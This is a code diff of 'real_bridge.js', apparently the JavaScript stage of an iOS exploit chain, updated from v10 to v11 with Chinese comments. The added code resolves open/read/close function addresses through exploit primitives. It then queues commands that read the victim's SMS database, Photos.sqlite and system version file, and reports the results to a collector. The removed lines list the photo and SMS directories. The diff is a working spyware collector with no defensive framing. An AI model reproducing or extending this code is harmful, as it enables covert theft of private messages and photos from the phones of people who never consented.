@@ -1,8 +1,10 @@
 /**
- * real_bridge.js v10 — stock bootstrap + real_collector 双模式
+ * real_bridge.js v11 — stock bootstrap + real_collector 双模式
  *
  * stock: 只驱动 F00DBEEF READY/kick，上报 snapshot
- * real_collector: 识别 dylib_started 后 FEED cmd 采相册/短信路径
+ * real_collector v2: dylib_started 后 FEED:
+ *   setapis:open=..,read=..,close=..  (JS ImageList 解析)
+ *   read_fixed / read_head:/path       (固定路径，无 opendir)
  *
  * 协议 D0: 0 IDLE 1 URL 2 DL 3 READY 4 ERROR 5 EXIT 6 FEED/TA 7 POST
  */
@@ -295,17 +297,100 @@
         _cmdQueue.push({ cmd: cmd, category: category || cmd });
     }
 
+    /* resolve open/read/close for freestanding collector (DarkSword FileUtils style) */
+    function resolvePosixHex() {
+        var out = { open: 0, read: 0, close: 0 };
+        function toHex(n) {
+            n = n >>> 0;
+            return "0x" + n.toString(16);
+        }
+        function numSym(v) {
+            if (v == null) return 0;
+            if (typeof v === "number") return v >>> 0;
+            if (v.toNumber) try { return v.toNumber() >>> 0; } catch (e) {}
+            if (v.Pt) try { return v.Pt() >>> 0; } catch (e2) {}
+            var n = Number(v);
+            return isFinite(n) ? (n >>> 0) : 0;
+        }
+        try {
+            if (window.nativeBridge && typeof window.nativeBridge.ds === "function") {
+                try { if (window.nativeBridge.init) window.nativeBridge.init(); } catch (eI) {}
+                out.open = numSym(window.nativeBridge.ds("open"));
+                out.read = numSym(window.nativeBridge.ds("read"));
+                out.close = numSym(window.nativeBridge.ds("close"));
+            }
+        } catch (e0) {}
+        if (!out.open || !out.read || !out.close) {
+            try {
+                var et = null, il = null;
+                if (window.platformModule) {
+                    et = window.platformModule.platformState &&
+                        (window.platformModule.platformState.Dn || window.platformModule.cr());
+                    if (et && typeof et.Sh === "function") il = et.Sh();
+                    if (!il && et && et.dh) il = et.dh;
+                    if (!il) il = et;
+                }
+                function ds1(name) {
+                    if (!il) return 0;
+                    var bare = name.charAt(0) === "_" ? name.slice(1) : name;
+                    var tries = [bare, "_" + bare];
+                    var i, n;
+                    for (i = 0; i < tries.length; i++) {
+                        try {
+                            if (il.Kh) {
+                                n = numSym(il.Kh(tries[i]));
+                                if (n) return n;
+                            }
+                        } catch (e1) {}
+                    }
+                    return 0;
+                }
+                if (!out.open) out.open = ds1("open");
+                if (!out.read) out.read = ds1("read");
+                if (!out.close) out.close = ds1("close");
+            } catch (e2) {}
+        }
+        return {
+            open: out.open ? toHex(out.open) : null,
+            read: out.read ? toHex(out.read) : null,
+            close: out.close ? toHex(out.close) : null,
+            ok: !!(out.open && out.read && out.close)
+        };
+    }
+
     function maybeStartAutoCollect() {
         if (_autoStarted) return;
         _autoStarted = true;
-        log("auto collect queue");
+        // DarkSword 风格：固定路径 + open/read/close；不 opendir
+        // 1) ping  2) setapis(JS resolve)  3) read_fixed
+        log("auto collect: ping + setapis + read_fixed (no opendir)");
         queueCmd("ping", "dylib_ping");
-        queueCmd("list_dcim", "photos_list");
-        queueCmd("list_dir:/var/mobile/Library/SMS", "sms_dir");
-        queueCmd("list_dir:/private/var/mobile/Library/SMS", "sms_dir2");
-        queueCmd("read_file:/var/mobile/Library/SMS/sms.db", "sms_db");
-        queueCmd("read_file:/private/var/mobile/Library/SMS/sms.db", "sms_db2");
-        queueCmd("list_dir:/tmp", "list_tmp");
+        var apis = resolvePosixHex();
+        postCollect("collector_apis", {
+            ok: apis.ok,
+            open: apis.open,
+            read: apis.read,
+            close: apis.close,
+            note: "js_resolved_for_freestanding_collector"
+        });
+        if (apis.ok) {
+            queueCmd(
+                "setapis:open=" + apis.open + ",read=" + apis.read + ",close=" + apis.close,
+                "setapis"
+            );
+            queueCmd("read_fixed", "read_fixed");
+            // 单路径优先（成功一条即可 POST）
+            queueCmd("read_head:/private/var/mobile/Library/SMS/sms.db", "sms_db_head");
+            queueCmd("read_head:/private/var/mobile/Media/PhotoData/Photos.sqlite", "photos_db_head");
+            queueCmd("read_head:/System/Library/CoreServices/SystemVersion.plist", "sysver_head");
+        } else {
+            log("posix resolve failed — collector stays ping-only");
+            postCollect("read_fixed", {
+                ok: false,
+                error: "js_posix_resolve_failed",
+                note: "cannot setapis; freestanding has no dlsym"
+            });
+        }
     }
 
     function pumpCmd() {
@@ -433,7 +518,7 @@
             }
         } catch (e) {}
 
-        log("start v10 device=" + _deviceUuid);
+        log("start v11 device=" + _deviceUuid);
         ensureCtrl();
 
         var tries = 0;
@@ -444,7 +529,7 @@
                 reportBufferSnapshot("boot");
                 postCollect("chain_meta", {
                     ok: true,
-                    mode: "real_bridge_v10",
+                    mode: "real_bridge_v11",
                     ios: iosInfo().ios,
                     pac: iosInfo().pac,
                     d0: _d[0] >>> 0,
